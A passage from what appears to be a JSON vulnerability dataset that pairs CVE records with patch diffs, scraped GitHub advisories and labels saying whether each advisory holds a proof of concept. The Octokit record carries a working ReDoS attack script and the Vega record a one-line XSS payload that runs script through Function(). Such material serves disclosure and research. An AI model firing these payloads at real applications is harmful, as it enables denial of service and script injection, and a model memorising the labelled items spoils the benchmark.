                "content": "fix: Ensure that installer generated token revocation checking action is correct. (#905)\n\nUnfortunately, when the igniter installer was introduced it generated\r\nan action which did not correctly check for token revocation.\r\n\r\nThis has been fixed, along with a verifier warning and an update which\r\nfixes the issue.\n\nFilename: .vscode/settings.json:\n```\n@@ -7,6 +7,7 @@\n\"Marties\",\n     \"moduledocs\",\n     \"oidc\",\n-    \"unguessable\"\n+    \"unguessable\",\n+    \"zipper\"\n   ]\n }\n```\n\nFilename: lib/ash_authentication/add_ons/confirmation/transformer.ex:\n```\n@@ -22,7 +22,7 @@\ndefmodule AshAuthentication.AddOn.Confirmation.Transformer do\n     with :ok <-\n            validate_token_generation_enabled(\n              dsl_state,\n-             \"Token generation must be enabled for password resets to work.\"\n+             \"Token generation must be enabled for confirmation to work.\"\n            ),\n          :ok <- validate_monitor_fields(dsl_state, strategy),\n          strategy <- maybe_set_confirm_action_name(strategy),\n```\n\nFilename: lib/ash_authentication/token_resource.ex:\n```\n@@ -145,7 +145,8 @@\ndefmodule AshAuthentication.TokenResource do\n \n   use Spark.Dsl.Extension,\n     sections: @dsl,\n-    transformers: [TokenResource.Transformer, TokenResource.Verifier]\n+    transformers: [TokenResource.Transformer],\n+    verifiers: [TokenResource.Verifier]\n \n   @doc \"\"\"\n   Has the token been revoked?\n```\n\nFilename: lib/ash_authentication/token_resource/is_revoked.ex:\n```\n@@ -1,13 +1,34 @@\ndefmodule AshAuthentication.TokenResource.IsRevoked do\n   @moduledoc \"\"\"\n-  Checks for the existence of a revocation token for the provided tokenrevocation token for the provided token.\n+  Checks for the existence of a revocation token for the provided token revocation token for the provided token.\n   \"\"\"\n   use Ash.Resource.Actions.Implementation\n+  alias Ash.Error.Action.InvalidArgument\n+  alias AshAuthentication.{Errors.InvalidToken, Jwt}\n \n   @impl true\n-  def run(input, _, _) do\n-    input.resource\n-    |> Ash.Query.do_filter(purpose: \"revocation\", jti: input.arguments.jti)\n+  def run(%{resource: resource, arguments: %{jti: jti}}, _, _) when is_binary(jti) do\n+    resource\n+    |> Ash.Query.do_filter(purpose: \"revocation\", jti: jti)\n+    |> Ash.Query.set_context(%{\n+      private: %{ash_authentication?: true}\n+    })\n     |> Ash.exists()\n   end\n+\n+  def run(%{arguments: %{token: token}} = input, opts, context) when is_binary(token) do\n+    case Jwt.peek(token) do\n+      {:ok, %{\"jti\" => jti}} -> run(%{input | arguments: %{jti: jti}}, opts, context)\n+      {:ok, _} -> {:error, InvalidToken.exception(type: :revocation)}\n+      {:error, reason} -> {:error, reason}\n+    end\n+  end\n+\n+  def run(_input, _, _) do\n+    {:error,\n+     InvalidArgument.exception(\n+       field: :jti,\n+       message: \"At least one of `jti` or `token` arguments must be present\"\n+     )}\n+  end\n end\n```\n\nFilename: lib/ash_authentication/token_resource/verifier.ex:\n```\n@@ -3,40 +3,79 @@\ndefmodule AshAuthentication.TokenResource.Verifier do\n   The token resource verifier.\n   \"\"\"\n \n-  use Spark.Dsl.Transformer\n+  use Spark.Dsl.Verifier\n   require Ash.Expr\n-  alias Spark.{Dsl.Transformer, Error.DslError}\n+  require Logger\n+  alias Spark.{Dsl.Verifier, Error.DslError}\n   import AshAuthentication.Utils\n+  import AshAuthentication.Validations.Action\n \n   @doc false\n   @impl true\n-  @spec after?(any) :: boolean()\n-  def after?(_), do: true\n+  @spec verify(map) :: :ok | {:error, term}\n+  def verify(dsl_state) do\n+    with :ok <- validate_domain_presence(dsl_state) do\n+      maybe_validate_is_revoked_action_arguments(dsl_state)\n+    end\n+  end\n \n-  @doc false\n-  @impl true\n-  @spec before?(any) :: boolean\n-  def before?(_), do: false\n+  defp maybe_validate_is_revoked_action_arguments(dsl_state) do\n+    case Verifier.get_option(dsl_state, [:token, :revocation], :is_revoked_action_name, :revoked?) do\n+      nil ->\n+        :ok\n \n-  @doc false\n-  @impl true\n-  @spec after_compile? :: boolean\n-  def after_compile?, do: true\n+      action_name ->\n+        case validate_action_exists(dsl_state, action_name) do\n+          {:ok, action} -> validate_is_revoked_action(dsl_state, action)\n+          {:error, _} -> :ok\n+        end\n+    end\n+  end\n \n-  @doc false\n-  @impl true\n-  @spec transform(map) ::\n-          :ok | {:ok, map} | {:error, term} | {:warn, map, String.t() | [String.t()]} | :halt\n-  def transform(dsl_state) do\n-    validate_domain_presence(dsl_state)\n+  defp validate_is_revoked_action(dsl_state, action) do\n+    with :ok <- validate_action_argument_option(action, :jti, :allow_nil?, [true]),\n+         :ok <- validate_action_argument_option(action, :token, :allow_nil?, [true]),\n+         :ok <- validate_action_option(action, :returns, [:boolean, Ash.Type.Boolean]) do\n+      :ok\n+    else\n+      {:error, _} ->\n+        Logger.warning(\"\"\"\n+        Warning while compiling #{inspect(Verifier.get_persisted(dsl_state, :module))}:\n+\n+        The `:jti` and `:token` options to the `#{inspect(action.name)}` action must allow nil values and it must return a `:boolean`.\n+\n+        This was an error in our igniter installer previous to version 4.4.9, which allowed revoked tokens to be reused.\n+\n+        To fix this, run the following command in your shell:\n+\n+            mix ash_authentication.upgrade 4.4.8 4.4.9\n+\n+        Or:\n+\n+          - remove `allow_nil?: false` from these action arguments, and\n+          - ensure that the action returns `:boolean`.\n+\n+          like so:\n+\n+            action :revoked?, :boolean do\n+              description \"Returns true if a revocation token is found for the provided token\"\n+              argument :token, :string, sensitive?: true\n+              argument :jti, :string, sensitive?: true\n+\n+              run AshAuthentication.TokenResource.IsRevoked\n+            end\n+        \"\"\")\n+\n+        :ok\n+    end\n   end\n \n   defp validate_domain_presence(dsl_state) do\n-    with domain when not is_nil(domain) <- Transformer.get_option(dsl_state, [:token], :domain),\n+    with domain when not is_nil(domain) <- Verifier.get_option(dsl_state, [:token], :domain),\n          :ok <- assert_is_module(domain),\n          true <- function_exported?(domain, :spark_is, 0),\n          Ash.Domain <- domain.spark_is() do\n-      {:ok, domain}\n+      :ok\n     else\n       nil ->\n         {:error,\n```\n\nFilename: lib/mix/tasks/ash_authentication.install.ex:\n```\n@@ -342,10 +342,10 @@\nif Code.ensure_loaded?(Igniter) do\n           end\n           \"\"\")\n           |> Ash.Resource.Igniter.add_action(token_resource, \"\"\"\n-          action :revoked? do\n+          action :revoked?, :boolean do\n             description \"Returns true if a revocation token is found for the provided token\"\n-            argument :token, :string, sensitive?: true, allow_nil?: false\n-            argument :jti, :string, sensitive?: true, allow_nil?: false\n+            argument :token, :string, sensitive?: true\n+            argument :jti, :string, sensitive?: true\n \n             run AshAuthentication.TokenResource.IsRevoked\n           end\n```\n\nFilename: lib/mix/tasks/ash_authentication.upgrade.ex:\n```\n@@ -0,0 +1,172 @@\n+# credo:disable-for-this-file Credo.Check.Design.AliasUsage\n+if Code.ensure_loaded?(Igniter) do\n+  defmodule Mix.Tasks.AshAuthentication.Upgrade do\n+    @moduledoc false\n+\n+    use Igniter.Mix.Task\n+\n+    @impl Igniter.Mix.Task\n+    def info(_argv, _composing_task) do\n+      %Igniter.Mix.Task.Info{\n+        # Groups allow for overlapping arguments for tasks by the same author\n+        # See the generators guide for more.\n+        group: :ash_authentication,\n+        # *other* dependencies to add\n+        # i.e `{:foo, \"~> 2.0\"}`\n+        adds_deps: [],\n+        # *other* dependencies to add and call their associated installers, if they exist\n+        # i.e `{:foo, \"~> 2.0\"}`\n+        installs: [],\n+        # An example invocation\n+        # example: __MODULE__.Docs.example(),\n+        example: \"example\",\n+        # a list of positional arguments, i.e `[:file]`\n+        positional: [:from, :to],\n+        # Other tasks your task composes using `Igniter.compose_task`, passing in the CLI argv\n+        # This ensures your option schema includes options from nested tasks\n+        composes: [],\n+        # `OptionParser` schema\n+        schema: [],\n+        # Default values for the options in the `schema`\n+        defaults: [],\n+        # CLI aliases\n+        aliases: [],\n+        # A list of options in the schema that are required\n+        required: []\n+      }\n+    end\n+\n+    @impl Igniter.Mix.Task\n+    def igniter(igniter) do\n+      positional = igniter.args.positional\n+      options = igniter.args.options\n+\n+      upgrades =\n+        %{\n+          \"4.4.9\" => [&fix_token_is_revoked_action/2]\n+        }\n+\n+      # For each version that requires a change, add it to this map\n+      # Each key is a version that points at a list of functions that take an\n+      # igniter and options (i.e. flags or other custom options).\n+      # See the upgrades guide for more.\n+      Igniter.Upgrades.run(igniter, positional.from, positional.to, upgrades,\n+        custom_opts: options\n+      )\n+    end\n+\n+    def fix_token_is_revoked_action(igniter, _opts) do\n+      case find_all_token_resources(igniter) do\n+        {igniter, []} ->\n+          igniter\n+\n+        {igniter, resources} ->\n+          Enum.reduce(resources, igniter, fn resource, igniter ->\n+            maybe_fix_is_revoked_action(igniter, resource)\n+          end)\n+      end\n+    end\n+\n+    defp find_all_token_resources(igniter) do\n+      Igniter.Project.Module.find_all_matching_modules(igniter, fn _module, zipper ->\n+        with {:ok, zipper} <- Igniter.Code.Module.move_to_use(zipper, Ash.Resource),\n+             {:ok, zipper} <- Igniter.Code.Function.move_to_nth_argument(zipper, 1),\n+             {:ok, zipper} <- Igniter.Code.Keyword.get_key(zipper, :extensions) do\n+          if Igniter.Code.List.list?(zipper) do\n+            match?(\n+              {:ok, _},\n+              Igniter.Code.List.move_to_list_item(\n+                zipper,\n+                &Igniter.Code.Common.nodes_equal?(&1, AshAuthentication.TokenResource)\n+              )\n+            )\n+          else\n+            Igniter.Code.Common.nodes_equal?(zipper, AshAuthentication.TokenResource)\n+          end\n+        end\n+      end)\n+    end\n+\n+    defp maybe_fix_is_revoked_action(igniter, resource) do\n+      Igniter.Project.Module.find_and_update_module!(igniter, resource, fn zipper ->\n+        with {:ok, action_zipper} <- move_to_action(zipper, :action, :revoked?),\n+             {:ok, zipper} <- Igniter.Code.Common.move_to_do_block(action_zipper),\n+             {:ok, zipper} <- remove_argument_option(zipper, :token, :allow_nil?),\n+             {:ok, zipper} <- remove_argument_option(zipper, :jti, :allow_nil?) do\n+          add_action_return_type(zipper, :boolean)\n+        else\n+          :error -> {:ok, zipper}\n+        end\n+      end)\n+    end\n+\n+    defp move_to_action(zipper, type, name) do\n+      Igniter.Code.Function.move_to_function_call(\n+        zipper,\n+        type,\n+        2,\n+        &Igniter.Code.Function.argument_equals?(&1, 0, name)\n+      )\n+    end\n+\n+    defp add_action_return_type(zipper, type) do\n+      zipper = Sourceror.Zipper.top(zipper)\n+\n+      with {:ok, zipper} <- move_to_action(zipper, :action, :revoked?),\n+           {:ok, zipper} <- Igniter.Code.Function.move_to_nth_argument(zipper, 1) do\n+        {:ok,\n+         Sourceror.Zipper.insert_left(\n+           zipper,\n+           quote do\n+             unquote(type)\n+           end\n+         )}\n+      end\n+    end\n+\n+    defp remove_argument_option(zipper, argument_name, option) do\n+      with {:ok, zipper} <-\n+             Igniter.Code.Function.move_to_function_call(\n+               zipper,\n+               :argument,\n+               3,\n+               &Igniter.Code.Function.argument_equals?(&1, 0, argument_name)\n+             ),\n+           {:ok, zipper} <- Igniter.Code.Function.move_to_nth_argument(zipper, 2) do\n+        if Igniter.Code.List.find_list_item_index(\n+             zipper,\n+             &Igniter.Code.Tuple.elem_equals?(&1, 0, :do)\n+           ) do\n+          Igniter.Code.Common.within(zipper, fn zipper ->\n+            {:ok,\n+             Igniter.Code.Common.remove(\n+               zipper,\n+               &Igniter.Code.Function.function_call?(&1, option, 1)\n+             )}\n+          end)\n+        else\n+          Igniter.Code.List.remove_from_list(\n+            zipper,\n+            &Igniter.Code.Tuple.elem_equals?(&1, 0, option)\n+          )\n+        end\n+      end\n+    end\n+  end\n+else\n+  defmodule Mix.Tasks.AshAuthentication.Upgrade do\n+    @moduledoc false\n+\n+    use Mix.Task\n+\n+    def run(_argv) do\n+      Mix.shell().error(\"\"\"\n+      The task 'ash_authentication.upgrade' requires igniter. Please install igniter and try again.\n+\n+      For more information, see: https://hexdocs.pm/igniter/readme.html#installation\n+      \"\"\")\n+\n+      exit({:shutdown, 1})\n+    end\n+  end\n+end\n```\n\nFilename: test/mix/tasks/ash_authentication.install_test.exs:\n```\n@@ -189,10 +189,10 @@\ndefmodule Mix.Tasks.AshAuthentication.InstallTest do\n           prepare(AshAuthentication.TokenResource.GetTokenPreparation)\n         end\n \n-        action :revoked? do\n+        action :revoked?, :boolean do\n           description(\"Returns true if a revocation token is found for the provided token\")\n-          argument(:token, :string, sensitive?: true, allow_nil?: false)\n-          argument(:jti, :string, sensitive?: true, allow_nil?: false)\n+          argument(:token, :string, sensitive?: true)\n+          argument(:jti, :string, sensitive?: true)\n \n           run(AshAuthentication.TokenResource.IsRevoked)\n         end\n```\n\nFilename: test/support/example/token.ex:\n```\n@@ -12,5 +12,14 @@\ndefmodule Example.Token do\n \n   actions do\n     defaults [:read, :destroy]\n+\n+    action :revoked? do\n+      description \"Returns true if a revocation token is found for the provided token\"\n+      argument :token, :string, sensitive?: true\n+      argument :jti, :string, sensitive?: true\n+\n+      run AshAuthentication.TokenResource.IsRevoked\n+      returns :boolean\n+    end\n   end\n end\n```",
                "url": "https://github.com/team-alembic/ash_authentication/commit/2dee55252df26fe3d990ff1199397cdcf1bfea8a"
            }
        ],
        "published_date": "2025-02-11T18:28:19.046Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nteam-alembic\n/\nash_authentication\nPublic\nNotifications You must be signed in to change notification settings\nFork 83\nStar 124\nCode\nIssues\n26\nPull requests\nDiscussions\nActions\nProjects\nSecurity\n2\nInsights\nAdditional navigation options\nFlawed token revocation checking logic in actions generated by `mix ash_authentication.install`\nModerate zachdaniel published GHSA-qrm9-f75w-hg4c on Feb 11Feb 11, 2025\nPackage\nerlang ash_authentication\n(\nErlang\n)\nAffected versions\n>= 4.1.0\nPatched versions\n4.4.9\nDescription\nImpact\nApplications which have been bootstrapped by the new igniter installer (since AshAuthentication v4.1.0) and who have used the magic link strategy, password resets, confirmation, or are manually revoking tokens are affected by revoked tokens being allowed to verify as valid. If you did not use the new installer, then you are absolutely not affected.\nAdditionally, unless you have implemented any kind of custom token revocation feature in your application (in which case even cursory testing would have uncovered this issue), then you will not be significantly affected.\nThe impact here for users is as follows:\nFor users using the magic link strategy, magic link tokens are reusable until they expire instead of being immediately revoked. By default magic link tokens are valid for 10 minutes.\nFor users of password resets in the password strategy, password reset tokens are reusable until they expire instead of being immediately revoked. By default password reset tokens are valid for 3 days.\nFor users of the confirmation add-on, confirmation tokens are reusable until they expire instead of being immediately revoked. By default password reset tokens are valid for 3 days.\nPatches\nThe flaw is patched in version 4.4.9. Additionally a compile time warning is shown to users with remediation instructions if they upgrade. 4.4.9 ships with an upgrader, so if you use mix igniter.upgrade ash_authentication the necessary patch will be applied for you. Otherwise you can run the upgrader manually as described in the error message\nExample\n[warning] Warning while compiling Tunez.Accounts.Token:\n\nThe `:jti` and `:token` options to the `:revoked?` action must allow nil values and it must return a `:boolean`.\n\nThis was an error in our igniter installer previous to version 4.4.9, which allowed revoked tokens to be reused.\n\nTo fix this, run the following command in your shell:\n\n    mix ash_authentication.upgrade 4.4.8 4.4.9\n\nOr:\n\n  - remove `allow_nil?: false` from these action arguments, and\n  - ensure that the action returns `:boolean`.\n\n  like so:\n\n    action :revoked?, :boolean do\n      description \"Returns true if a revocation token is found for the provided token\"\n      argument :token, :string, sensitive?: true\n      argument :jti, :string, sensitive?: true\n\n      run AshAuthentication.TokenResource.IsRevoked\n    end\nWorkarounds\nDelete the generated :revoked? generic action in your token resource This will cause it to use the one internal to AshAuthentication which has always been correct. Alternatively, manually make the changes described above.\nReferences\nSee the #ash_authentication channel on the Ash Discord.\nSeverity\nModerate\nCVE ID\nCVE-2025-25202\nWeaknesses\nNo CWEs\nCredits\nwilburyang\nReporter\nzachdaniel\nRemediation reviewer\njimsynz\nRemediation developer\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The advisory does not include a specific proof of concept or fully detailed steps to reproduce the vulnerability.",
                "url": "https://github.com/team-alembic/ash_authentication/security/advisories/GHSA-qrm9-f75w-hg4c"
            }
        ],
        "sw_version": "v4.1.0",
        "sw_version_wget": "https://github.com/team-alembic/ash_authentication/archive/refs/tags/v4.1.0.zip"
    },
    "CVE-2025-25288": {
        "cwe": [
            {
                "id": "CWE-1333",
                "value": "CWE-1333: Inefficient Regular Expression Complexity"
            }
        ],
        "description": "@octokit/plugin-paginate-rest is the Octokit plugin to paginate REST API endpoint responses. For versions starting in 1.0.0 and prior to 11.4.1 of the npm package `@octokit/plugin-paginate-rest`, when calling `octokit.paginate.iterator()`, a specially crafted `octokit` instance\u2014particularly with a malicious `link` parameter in the `headers` section of the `request`\u2014can trigger a ReDoS attack. Version 11.4.1 contains a fix for the issue.",
        "languages": [
            "TypeScript"
        ],
        "patch_commits": [
            {
                "content": "Merge commit from fork\n\n* regular expression term vulnerability\n\n* regular expression term vulnerability\n\nFilename: src/iterator.ts:\n```\n@@ -37,7 +37,7 @@\nexport function iterator(\n           // '<https://api.github.com/users/aseemk/followers?page=2>; rel=\"next\", <https://api.github.com/users/aseemk/followers?page=2>; rel=\"last\"'\n           // sets `url` to undefined if \"next\" URL is not present or `link` header is not set\n           url = ((normalizedResponse.headers.link || \"\").match(\n-            /<([^>]+)>;\\s*rel=\"next\"/,\n+            /<([^<>]+)>;\\s*rel=\"next\"/,\n           ) || [])[1];\n \n           return { value: normalizedResponse };\n```\n\nFilename: test/paginate.test.ts:\n```\n@@ -10,6 +10,38 @@\nconst ORG2 = { id: 2 };\n \n const TestOctokit = Octokit.plugin(paginateRest, restEndpointMethods);\n describe(\"pagination\", () => {\n+  it(\"Test ReDoS - attack string\", async () => {\n+    const ReDosOctokit = Octokit.plugin(paginateRest);\n+    const octokit = new ReDosOctokit({\n+      auth: \"your-github-token\",\n+    });\n+    octokit.hook.wrap(\"request\", async (request, options) => {\n+      const maliciousLinkHeader = \"\" + \"<\".repeat(100000) + \">\";\n+      return {\n+        data: [],\n+        headers: {\n+          link: maliciousLinkHeader,\n+        },\n+      };\n+    });\n+    const startTime = performance.now();\n+    try {\n+      for await (const normalizedResponse of octokit.paginate.iterator(\n+        \"GET /repos/{owner}/{repo}/issues\", { owner: \"DayShift\", repo: \"ReDos\", per_page: 100 }\n+      )) {}\n+    } catch (error) {\n+      // pass\n+    }\n+    const endTime = performance.now();\n+    const elapsedTime = endTime - startTime;\n+    const reDosThreshold = 2000; \n+    \n+    expect(elapsedTime).toBeLessThanOrEqual(reDosThreshold);\n+    if (elapsedTime > reDosThreshold) {\n+      console.warn(`\ud83d\udea8 Potential ReDoS Attack! getDuration method took ${elapsedTime.toFixed(2)} ms, exceeding threshold of ${reDosThreshold} ms.`);\n+    }\n+  });\n+\n   it(\".paginate()\", async () => {\n     const mock = fetchMock\n       .createInstance()\n```",
                "url": "https://github.com/octokit/plugin-paginate-rest.js/commit/bb6c4f945d8023902cf387391d2b2209261044ab"
            }
        ],
        "published_date": "2025-02-14T19:33:43.428Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\noctokit\n/\nplugin-paginate-rest.js\nPublic\nNotifications You must be signed in to change notification settings\nFork 27\nStar 51\nCode\nIssues\n5\nPull requests\n2\nActions\nSecurity\n1\nInsights\nAdditional navigation options\nRegular Expression in iterator Leads to ReDoS Vulnerability Due to Catastrophic Backtracking\nModerate nickfloyd published GHSA-h5c3-5r3r-rr8q on Feb 14Feb 14, 2025\nPackage\nnpm @octokit/plugin-paginate-rest\n(\nnpm\n)\nAffected versions\n>=v1.0.0\nPatched versions\n>=v11.4.1\nDescription\nSummary\nFor the npm package @octokit/plugin-paginate-rest, when calling octokit.paginate.iterator(), a specially crafted octokit instance\u2014particularly with a malicious link parameter in the headers section of the request\u2014can trigger a ReDoS attack.\nDetails\nThe issue occurs at line 39 of iterator.ts in the @octokit/plugin-paginate-rest repository. The relevant code is as follows:\nurl = ((normalizedResponse.headers.link || \"\").match(\n  /<([^>]+)>;\\s*rel=\"next\"/,\n) || [])[1];\nThe regular expression /<([^>]+)>;\\s*rel=\"next\"/ may lead to a potential backtracking vulnerability, resulting in a ReDoS (Regular Expression Denial of Service) attack. This could cause high CPU utilization and even service slowdowns or freezes when processing specially crafted Link headers.\nPoC\nThe gist of PoC.js\nrun npm i @octokit/plugin-paginate-rest\nrun 'node poc.js'\nresult:\nthen the program will stuck forever with high CPU usage\nimport { Octokit } from \"@octokit/core\";\nimport { paginateRest } from \"@octokit/plugin-paginate-rest\";\n\nconst MyOctokit = Octokit.plugin(paginateRest);\nconst octokit = new MyOctokit({\n  auth: \"your-github-token\",\n});\n\n// Intercept the request to inject a malicious 'link' header for ReDoS\noctokit.hook.wrap(\"request\", async (request, options) => {\n  const maliciousLinkHeader = \"\" + \"<\".repeat(100000) + \">\"; // attack string\n  return {\n    data: [],\n    headers: {\n      link: maliciousLinkHeader, // Inject malicious 'link' header\n    },\n  };\n});\n\n// Trigger the ReDoS attack by paginating through GitHub issues\n(async () => {\n  try {\n    for await (const normalizedResponse of octokit.paginate.iterator(\n      \"GET /repos/{owner}/{repo}/issues\", { owner: \"DayShift\", repo: \"ReDos\", per_page: 100 }\n    )) {\n      console.log({ normalizedResponse });\n    }\n  } catch (error) {\n    console.error(\"Error encountered:\", error);\n  }\n})();\nImpact\nWhat kind of vulnerability is it?\nThis is a Regular Expression Denial of Service (ReDoS) vulnerability, which occurs due to excessive backtracking in the regex pattern:\n/<([^>]+)>;\\s*rel=\"next\"/\nWhen processing a specially crafted Link header, this regex can cause significant performance degradation, leading to high CPU utilization and potential service unresponsiveness.\nWho is impacted?\nUsers of @octokit/plugin-paginate-rest who call octokit.paginate.iterator() and process untrusted or manipulated Link headers.\nApplications relying on Octokit's pagination mechanism, particularly those handling large volumes of API requests.\nGitHub API consumers who integrate this package into their projects for paginated data retrieval.\nSeverity\nModerate\n5.3\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nLow\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L\nCVE ID\nCVE-2025-25288\nWeaknesses\nCWE-1333\nCredits\nShiyuBanzhou\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory contains a 'Proof of Concept' code segment demonstrating how to exploit the Regular Expression Denial of Service (ReDoS) vulnerability in the specified library.",
                "url": "https://github.com/octokit/plugin-paginate-rest.js/security/advisories/GHSA-h5c3-5r3r-rr8q"
            }
        ],
        "sw_version": "v1.0.0",
        "sw_version_wget": "https://github.com/octokit/plugin-paginate-rest.js/archive/refs/tags/v1.0.0.zip"
    },
    "CVE-2025-25304": {
        "cwe": [
            {
                "id": "CWE-79",
                "value": "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
            }
        ],
        "description": "Vega is a visualization grammar, a declarative format for creating, saving, and sharing interactive visualization designs. Prior to version 5.26.0 of vega and 5.4.2 of vega-selections, the `vlSelectionTuples` function can be used to call JavaScript functions, leading to cross-site scripting.`vlSelectionTuples` calls multiple functions that can be controlled by an attacker, including one call with an attacker-controlled argument. This can be used to call `Function()` with arbitrary JavaScript and the resulting function can be called with `vlSelectionTuples` or using a type coercion to call `toString` or `valueOf`. Version 5.26.0 of vega and 5.4.2 of vega-selections fix this issue.",
        "languages": [
            "JavaScript"
        ],
        "patch_commits": [
            {
                "content": "Merge pull request from GHSA-mp7w-mhcv-673j\n\nFilename: packages/vega-selections/src/selectionResolve.js:\n```\n@@ -1,6 +1,6 @@\nimport {intersection, union} from 'd3-array';\n import {array, toNumber} from 'vega-util';\n-import {$selectionId, And, Or, SelectionId, Union, VlMulti, VlPoint} from './constants';\n+import {$selectionId, And, Or, SelectionId, Union, VlMulti, VlPoint} from './util';\n \n /**\n  * Resolves selection for use as a scale domain or reads via the API.\n```\n\nFilename: packages/vega-selections/src/selectionTest.js:\n```\n@@ -1,6 +1,6 @@\nimport {bisector} from 'd3-array';\n-import {$selectionId, Intersect} from './constants';\n-import {field, inrange, isArray, isDate, toNumber} from 'vega-util';\n+import {inrange, isArray, isDate, toNumber} from 'vega-util';\n+import {$selectionId, Intersect, getter} from './util';\n \n const TYPE_ENUM = 'E',\n     TYPE_RANGE_INC = 'R',\n\n@@ -18,8 +18,7 @@\nfunction testPoint(datum, entry) {\n \n   for (; i<n; ++i) {\n     f = fields[i];\n-    f.getter = field.getter || field(f.field);\n-    dval = f.getter(datum);\n+    dval = getter(f)(datum);\n \n     if (isDate(dval)) dval = toNumber(dval);\n     if (isDate(values[i])) values[i] = toNumber(values[i]);\n```\n\nFilename: packages/vega-selections/src/selectionTuples.js:\n```\n@@ -1,5 +1,5 @@\n-import {extend, field} from 'vega-util';\n-import {$selectionId, SelectionId} from './constants';\n+import {extend} from 'vega-util';\n+import {$selectionId, SelectionId, getter} from './util';\n \n /**\n  * Maps an array of scene graph items to an array of selection tuples.\n\n@@ -11,7 +11,7 @@\nimport {$selectionId, SelectionId} from './constants';\n export function selectionTuples(array, base) {\n   return array.map(x => extend(\n     base.fields ? {\n-      values: base.fields.map(f => (f.getter || (f.getter = field(f.field)))(x.datum))\n+      values: base.fields.map(f => getter(f)(x.datum))\n     } : {\n       [SelectionId]: $selectionId(x.datum)\n     }, base));\n```\n\nFilename: packages/vega-selections/src/selectionVisitor.js:\n```\n@@ -1,6 +1,6 @@\n-import {Intersect} from './constants';\n import {Literal} from 'vega-expression';\n import {error, hasOwnProperty, peek} from 'vega-util';\n+import {Intersect} from './util';\n \n const DataPrefix = ':',\n       IndexPrefix = '@';\n```\n\nFilename: packages/vega-selections/src/util.js:\n```\n@@ -1,5 +1,16 @@\nimport {field} from 'vega-util';\n \n+// Registers vega-util field accessors to protect against XSS attacks\n+const SELECTION_GETTER = Symbol('vega_selection_getter');\n+export function getter(f) {\n+  if (!f.getter || !f.getter[SELECTION_GETTER]) {\n+    f.getter = field(f.field);\n+    f.getter[SELECTION_GETTER] = true;\n+  }\n+\n+  return f.getter;\n+}\n+\n export const Intersect = 'intersect';\n export const Union = 'union';\n export const VlMulti = 'vlMulti';\n```",
                "url": "https://github.com/vega/vega/commit/9fb9ea07e27984394e463d286eb73944fa61411e"
            }
        ],
        "published_date": "2025-02-14T19:28:00.388Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nvega\n/\nvega\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 1.5k\nStar 11.5k\nCode\nIssues\n446\nPull requests\n24\nDiscussions\nActions\nSecurity\n7\nInsights\nAdditional navigation options\nXSS via vlSelectionTuples function\nModerate domoritz published GHSA-mp7w-mhcv-673j on Feb 14Feb 14, 2025\nPackage\nnpm vega\n(\nnpm\n)\nAffected versions\n< v5.26.0\nPatched versions\nv5.26.0\nnpm vega-selections\n(\nnpm\n)\n< 5.4.2\n5.4.2\nDescription\nSummary\nThe vlSelectionTuples function can be used to call JavaScript functions, leading to XSS.\nDetails\nvlSelectionTuples calls multiple functions that can be controlled by an attacker, including one call with an attacker-controlled argument.\nExample call: vlSelectionTuples([{datum:<argument>}], {fields:[{getter:<function>}]})\nThis can be used to call Function() with arbitrary JavaScript and the resulting function can be called with vlSelectionTuples or using a type coercion to call toString or valueOf.\nPoC\n{\"$schema\":\"https://vega.github.io/schema/vega/v5.json\",\"signals\":[{\"name\":\"a\",\"init\":\"+{valueOf:vlSelectionTuples([{datum:'alert(1)'}],{fields:[{getter:[].at.constructor}]})[0].values[0]}\"}]}\nSeverity\nModerate\nCVE ID\nCVE-2025-25304\nWeaknesses\nCWE-79\nCredits\nFallingPineapples\nReporter\ndomoritz\nOther\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory includes a PoC in the form of a JSON object that exploits the vulnerability to perform a simple JavaScript alert.",
                "url": "https://github.com/vega/vega/security/advisories/GHSA-mp7w-mhcv-673j"
            }
        ],
        "sw_version": "v5.25.0",
        "sw_version_wget": "https://github.com/vega/vega/archive/refs/tags/v5.25.0.zip"
    },
    "CVE-2025-2592": {
        "cwe": [
            {
                "id": "CWE-122",
                "value": "Heap-based Buffer Overflow"
            },
            {
                "id": "CWE-119",
                "value": "Memory Corruption"
            }
        ],
        "description": "A vulnerability, which was classified as critical, has been found in Open Asset Import Library Assimp 5.4.3. This issue affects the function CSMImporter::InternReadFile of the file code/AssetLib/CSM/CSMLoader.cpp. The manipulation leads to heap-based buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The patch is named 2690e354da0c681db000cfd892a55226788f2743. It is recommended to apply a patch to fix this issue.",
        "languages": [
            "C++"
        ],
        "patch_commits": [
            {
